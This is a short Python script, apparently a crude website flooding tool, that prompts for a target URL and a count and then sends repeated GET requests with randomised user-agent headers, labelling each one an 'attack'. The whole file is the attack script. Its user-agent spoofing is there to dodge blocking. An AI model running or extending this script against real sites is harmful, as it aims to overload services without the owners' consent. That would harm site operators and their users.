from fake_useragent import UserAgent
import requests


url = input(">> Enter site for hack: ")
quanity = int(input(">> Quanity haching: "))


for itter in range(1, quanity + 1):
    status_code = requests.get(url, headers={"user-agent": UserAgent(verify_ssl=False).random}).status_code
    print("{}) attack ::: [Successfully {} => Status Code: {}]".format(itter, url, status_code))